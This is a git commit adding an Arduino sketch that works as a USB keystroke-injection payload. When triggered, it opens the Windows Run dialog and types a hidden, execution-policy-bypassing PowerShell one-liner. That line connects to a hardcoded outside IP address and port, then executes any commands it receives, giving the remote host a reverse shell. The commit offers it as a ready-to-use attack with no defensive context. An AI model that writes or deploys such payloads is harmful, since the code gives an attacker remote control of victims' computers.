e81074303a44f85e2d53f8890477f2efd86404ae
krypton101 <51450260+krypton101@users.noreply.github.com>
2021-07-07 20:15:57 +0700

    Create payload.ino

---
+++ payload.ino
@@ -0,0 +1,65 @@
+
+#include "Keyboard.h"
+#include "Mouse.h"
+
+#define blinkInterval 50
+#define ledPin 3
+#define buttonPin 6
+
+int defaultDelay = 4;
+int defaultCharDelay = 5;
+int rMin = 0;
+int rMax = 100;
+
+bool ledOn = true;
+
+void typeKey(int key){
+  Keyboard.press(key);
+  delay(defaultCharDelay);
+  Keyboard.release(key);
+}
+
+void setup(){
+  
+  pinMode(buttonPin, INPUT_PULLUP);
+  pinMode(ledPin, OUTPUT);
+  digitalWrite(ledPin, HIGH);
+  
+  if(digitalRead(buttonPin) == LOW){
+    
+    Keyboard.begin();
+    Mouse.begin();
+    
+    /* ----- Begin-Script -----*/
+    
+    /* [Parsed By Duckuino (Licensed under MIT) - for more information visit: https://github.com/Nurrl/Dckuino.js] */    
+    delay(400);
+
+    delay(defaultDelay);
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press(114);
+    Keyboard.releaseAll();
+
+    delay(defaultDelay);
+    delay(100);
+
+    delay(defaultDelay);
+    Keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"3.141.142.211\",16367);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    delay(50);
+    
+    /* ----- End-Script -----*/
+    
+    Keyboard.end();
+  }
+}
+
+void loop(){
+  ledOn = !ledOn;
+  digitalWrite(ledPin, ledOn);
+  delay(blinkInterval);
+}
